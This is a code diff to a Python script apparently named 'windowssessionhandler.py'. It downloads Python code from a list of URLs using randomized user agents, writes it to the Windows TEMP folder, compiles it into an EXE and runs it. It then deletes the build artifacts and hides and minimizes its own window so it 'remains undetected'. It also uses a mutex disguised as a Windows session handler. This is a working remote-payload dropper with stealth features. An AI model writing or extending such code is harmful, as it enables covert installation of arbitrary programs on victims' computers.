@@ -8,17 +8,23 @@ import win32api
 import win32con
 import win32event
 import win32clipboard
+import ctypes
 
-# Function to create a mutex to check if the process is already running
 def create_mutex(mutex_name):
-    mutex = win32event.CreateMutex(None, 0, mutex_name)
-    if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+    try:
+        print(f"Creating mutex: {mutex_name}")
+        mutex = win32event.CreateMutex(None, 0, mutex_name)
+        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+            print(f"Mutex {mutex_name} already exists.")
+            return False
+        print(f"Mutex {mutex_name} created successfully.")
+        return True
+    except Exception as e:
+        print(f"Error creating mutex: {e}")
         return False
-    return True
 
-# Mutex check before proceeding
 if os.name == "nt":
-    mutex_name = "WindowsSessionHandler"  # Name the mutex uniquely for your program
+    mutex_name = "WindowsSessionHandler"
     if not create_mutex(mutex_name):
         print("Mutex already exists. Exiting program.")
         sys.exit(0)
@@ -32,28 +38,37 @@ user_agents = [
 ]
 
 def fetch_python_code(url):
-    user_agent = random.choice(user_agents)
-    headers = {'User-Agent': user_agent}
-    req = urllib.request.Request(url, headers=headers)
     try:
+        print(f"Fetching code from URL: {url}")
+        user_agent = random.choice(user_agents)
+        headers = {'User-Agent': user_agent}
+        req = urllib.request.Request(url, headers=headers)
         with urllib.request.urlopen(req) as response:
-            return response.read().decode('utf-8')
+            code = response.read().decode('utf-8')
+        print(f"Code fetched successfully from {url}")
+        return code
     except Exception as e:
         print(f"Error fetching URL {url}: {e}")
         return None
 
 def write_python_file(code, filename):
-    if code:
-        temp_dir = os.getenv('TEMP')
-        py_file_path = os.path.join(temp_dir, filename)
-        with open(py_file_path, 'w', encoding='utf-8') as f:
-            f.write(code)
-        return py_file_path
+    try:
+        if code:
+            temp_dir = os.getenv('TEMP')
+            py_file_path = os.path.join(temp_dir, filename)
+            print(f"Writing to file: {py_file_path}")
+            with open(py_file_path, 'w', encoding='utf-8') as f:
+                f.write(code)
+            print(f"File written successfully: {py_file_path}")
+            return py_file_path
+    except Exception as e:
+        print(f"Error writing file {filename}: {e}")
     return None
 
 def compile_python_to_exe(py_file_path):
-    if py_file_path:
-        try:
+    try:
+        if py_file_path:
+            print(f"Compiling Python file to EXE: {py_file_path}")
             temp_dir = os.getenv('TEMP')
             dist_folder = os.path.join(temp_dir, "dist")
             build_folder = os.path.join(temp_dir, "build")
@@ -70,27 +85,36 @@ def compile_python_to_exe(py_file_path):
             
             exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
             if os.path.exists(exe_file_path):
+                print(f"EXE compiled successfully: {exe_file_path}")
                 return exe_file_path
             else:
-                print(f"Error: {exe_file_path} not found in dist folder")
-        except Exception as e:
-            print(f"Error compiling {py_file_path}: {e}")
+                print(f"Error: EXE not found in dist folder.")
+    except Exception as e:
+        print(f"Error compiling {py_file_path}: {e}")
     return None
 
 def execute_exe_file(exe_file_path):
-    if exe_file_path:
-        try:
+    try:
+        if exe_file_path:
+            print(f"Executing EXE file: {exe_file_path}")
             subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
-        except Exception as e:
-            print(f"Error executing {exe_file_path}: {e}")
+            print(f"Execution started for {exe_file_path}")
+    except Exception as e:
+        print(f"Error executing {exe_file_path}: {e}")
 
 def clean_up(temp_files):
-    for item in temp_files:
-        if os.path.exists(item):
-            if os.path.isdir(item):
-                shutil.rmtree(item)
-            else:
-                os.remove(item)
+    try:
+        print(f"Cleaning up temporary files: {temp_files}")
+        for item in temp_files:
+            if os.path.exists(item):
+                if os.path.isdir(item):
+                    shutil.rmtree(item)
+                    print(f"Deleted directory: {item}")
+                else:
+                    os.remove(item)
+                    print(f"Deleted file: {item}")
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
 
 def install_and_execute(urls_and_filenames):
     temp_dir = os.getenv('TEMP')
@@ -129,22 +153,24 @@ urls_and_filenames = [
 ]
 
 def set_invisible():
-    hwnd = win32gui.GetForegroundWindow()  # Get the handle of the current active window
+    try:
+        hwnd = win32gui.GetForegroundWindow()  # Get the handle of the current active window
+        print(f"Making window with handle {hwnd} invisible.")
+        # Make the window invisible on taskbar
+        ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 is SW_HIDE which hides the window
 
-    # Make the window invisible on taskbar
-    ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 is SW_HIDE which hides the window
+        # Set window transparency to 100% (completely invisible)
+        extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
+        win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
+        win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)  # Fully transparent
 
-    # Set window transparency to 100% (completely invisible)
-    extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
-    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
-    win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)  # Fully transparent
+        # Set TopMost to False, so window cannot be touched or interacted with
+        win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
 
-    # Set TopMost to False, so window cannot be touched or interacted with
-    win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+        # Make sure the window remains undetected
+        gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()  # Minimize the window from taskbar
+        print(f"Window successfully made invisible.")
+    except Exception as e:
+        print(f"Error setting window invisible: {e}")
 
-    # Make sure the window remains undetected
-    gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()  # Minimize the window from taskbar
-
-import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran windowssessionhandler.py", "Message", 0)
 install_and_execute(urls_and_filenames)
-import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran windowssessionhandler.py install & execute", "Message", 0)
